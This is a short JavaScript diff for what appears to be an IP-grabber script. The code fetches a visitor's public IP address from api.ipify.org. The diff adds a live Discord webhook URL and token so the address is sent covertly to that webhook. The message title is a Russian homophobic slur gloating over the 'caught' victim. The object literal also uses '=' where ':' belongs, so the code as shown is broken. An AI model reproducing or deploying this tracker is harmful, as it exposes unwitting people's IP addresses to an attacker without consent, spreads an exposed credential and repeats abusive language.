@@ -5,7 +5,7 @@ fetch("https://api.ipify.org/?format=json");
 })
 .then(function(data) {
   ip = data.ip;
-  var webhook = "";
+  var webhook = "https://discord.com/api/webhooks/1126295689748553841/xQ_9FQHol7Uj9afyn54a_W1NfCykITR-7lPyPhY1xINoZ84x-5_Ht83U3e2JM9vFoPgj";
   var message = {
     title = "Поймали пидорка",
     description = "Его айпи " + ip
